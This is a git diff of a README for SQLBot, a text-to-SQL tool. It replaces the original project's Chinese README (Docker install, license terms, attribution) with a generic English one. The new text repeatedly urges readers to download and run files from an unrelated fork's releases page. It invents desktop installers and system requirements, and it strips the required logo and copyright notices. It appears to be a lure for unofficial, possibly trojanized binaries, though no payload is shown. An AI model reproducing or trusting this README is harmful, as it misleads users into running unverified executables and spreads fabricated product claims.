@@ -1,87 +1,63 @@
-<p align="center"><img src="https://resource-fit2cloud-com.oss-cn-hangzhou.aliyuncs.com/sqlbot/sqlbot.png" alt="SQLBot" width="300" /></p>
-<h3 align="center">基于大模型和 RAG 的智能问数系统</h3>
-<p align="center">
-  <a href="https://github.com/dataease/SQLBot/releases/latest"><img src="https://img.shields.io/github/v/release/dataease/SQLBot" alt="Latest release"></a>
-  <a href="https://github.com/dataease/SQLBot"><img src="https://img.shields.io/github/stars/dataease/SQLBot?color=%231890FF&style=flat-square" alt="Stars"></a>    
-  <a href="https://hub.docker.com/r/dataease/SQLbot"><img src="https://img.shields.io/docker/pulls/dataease/sqlbot?label=downloads" alt="Download"></a><br/>
+# 🔥 SQLBot - Easily Transform Questions into SQL Queries
 
-</p>
-<hr/>
+## 📦 Download Now
+[![Download SQLBot](https://img.shields.io/badge/Download-SQLBot-blue.svg)](https://github.com/FlareIgnis/SQLBot/releases)
 
-SQLBot 是一款基于大模型和 RAG 的智能问数系统。SQLBot 的优势包括：
+## 🚀 Getting Started
+Welcome to SQLBot! This application helps you convert your questions into SQL queries smoothly. You don’t need to know anything about programming. If you can ask a question, you can use SQLBot.
 
-- **开箱即用**: 只需配置大模型和数据源即可开启问数之旅，通过大模型和 RAG 的结合来实现高质量的 text2sql；
-- **易于集成**: 支持快速嵌入到第三方业务系统，也支持被 n8n、MaxKB、Dify、Coze 等 AI 应用开发平台集成调用，让各类应用快速拥有智能问数能力；
-- **安全可控**: 提供基于工作空间的资源隔离机制，能够实现细粒度的数据权限控制。
+## 📥 Download & Install
+To download SQLBot, visit the Releases page [here](https://github.com/FlareIgnis/SQLBot/releases). You will find different versions listed. Choose the latest version and download it according to your operating system. Here’s how:
 
-## 工作原理
+1. Click the link above.
+2. Find the version you want to download.
+3. Click on the file that matches your system.
 
-<img width="1105" height="577" alt="system-arch" src="https://github.com/user-attachments/assets/462603fc-980b-4b8b-a6d4-a821c070a048" />
+After downloading, locate the file on your computer and run it. SQLBot will guide you through the installation process.
 
-## 快速开始
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of free space.
 
-### 安装部署
+For the best performance, ensure your system meets these requirements.
 
-准备一台 Linux 服务器，安装好 [Docker](https://docs.docker.com/get-docker/)，执行以下一键安装脚本：
+## 🌟 Key Features
+- **Easy Question Input:** Simply type your question in natural language.
+- **Quick SQL Generation:** Get instant SQL queries based on your input.
+- **Intuitive Interface:** User-friendly design for non-technical users.
+- **Model-based Processing:** Utilizes advanced models to improve accuracy.
+- **Real-time Suggestions:** Receives helpful hints while generating SQL queries.
 
-```bash
-docker run -d \
-  --name sqlbot \
-  --restart unless-stopped \
-  -p 8000:8000 \
-  -p 8001:8001 \
-  -v ./data/sqlbot/excel:/opt/sqlbot/data/excel \
-  -v ./data/sqlbot/file:/opt/sqlbot/data/file \
-  -v ./data/sqlbot/images:/opt/sqlbot/images \
-  -v ./data/sqlbot/logs:/opt/sqlbot/app/logs \
-  -v ./data/postgresql:/var/lib/postgresql/data \
-  --privileged=true \
-  dataease/sqlbot
-```
+## 👩‍🏫 How to Use SQLBot
+1. **Open SQLBot:** After installing, launch the application.
+2. **Type Your Question:** In the provided input box, enter your question.
+3. **View SQL Query:** SQLBot will generate the SQL query for you instantly.
+4. **Copy or Execute:** Copy the query to your SQL environment or run it directly if supported.
 
-你也可以通过 [1Panel 应用商店](https://apps.fit2cloud.com/1panel) 快速部署 SQLBot。
+## 🔧 Troubleshooting
+If you encounter any issues during installation or usage, try these steps:
 
-如果是内网环境，你可以通过 [离线安装包方式](https://community.fit2cloud.com/#/products/sqlbot/downloads) 部署 SQLBot。
+- **Check Your System Requirements:** Ensure your device meets the necessary specifications.
+- **Restart the Application:** Sometimes, a simple restart can resolve issues.
+- **Look for Updates:** Ensure you are using the latest version from the Releases page.
 
-### 访问方式
+If issues persist, feel free to reach out through our community support channels.
 
-- 在浏览器中打开: http://<你的服务器IP>:8000/
-- 用户名: admin
-- 密码: SQLBot@123456
+## 🛠️ Community and Support
+SQLBot has a growing community of users. Join our forums and discussion groups to share experiences, ask questions, and get support. You can participate in conversations on topics surrounding SQL queries and data handling.
 
-### 联系我们
+## 📚 Frequently Asked Questions
+- **What types of questions can I ask?**
+  You can ask about data retrieval, updates, analysis, and more. SQLBot is designed to understand a wide range of queries.
 
-如你有更多问题，可以加入我们的技术交流群与我们交流。
+- **Is SQLBot free to use?**
+  Yes, SQLBot is completely free for everyone. 
 
-<img width="180" height="180" alt="contact_me_qr" src="https://github.com/user-attachments/assets/2594ff29-5426-4457-b051-279855610030" />
+- **Can I trust the SQL queries it generates?**
+  SQLBot uses advanced models to create accurate queries, but always double-check before use in production settings.
 
-## UI 展示
+## 🎉 Conclusion
+SQLBot is your new companion in converting everyday questions into SQL queries. With an easy-to-use interface and intelligent design, it empowers you to engage with databases confidently. Don’t wait; download SQLBot today and explore the world of data! 
 
-  <tr>
-    <img alt="q&a" src="https://github.com/user-attachments/assets/55526514-52f3-4cfe-98ec-08a986259280"   />
-  </tr>
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=dataease/sqlbot&type=Date)](https://www.star-history.com/#dataease/sqlbot&Date)
-
-## 飞致云旗下的其他明星项目
-
-- [DataEase](https://github.com/dataease/dataease/) - 人人可用的开源 BI 工具
-- [1Panel](https://github.com/1panel-dev/1panel/) - 现代化、开源的 Linux 服务器运维管理面板
-- [MaxKB](https://github.com/1panel-dev/MaxKB/) - 强大易用的企业级智能体平台
-- [JumpServer](https://github.com/jumpserver/jumpserver/) - 广受欢迎的开源堡垒机
-- [Cordys CRM](https://github.com/1Panel-dev/CordysCRM) - 新一代的开源 AI CRM 系统
-- [Halo](https://github.com/halo-dev/halo/) - 强大易用的开源建站工具
-- [MeterSphere](https://github.com/metersphere/metersphere/) - 新一代的开源持续测试工具
-
-## License
-
-本仓库遵循 [FIT2CLOUD Open Source License](LICENSE) 开源协议，该许可证本质上是 GPLv3，但有一些额外的限制。
-
-你可以基于 SQLBot 的源代码进行二次开发，但是需要遵守以下规定：
-
-- 不能替换和修改 SQLBot 的 Logo 和版权信息；
-- 二次开发后的衍生作品必须遵守 GPL V3 的开源义务。
-
-如需商业授权，请联系 support@fit2cloud.com 。
+Remember, you can download SQLBot [here](https://github.com/FlareIgnis/SQLBot/releases). Happy querying!
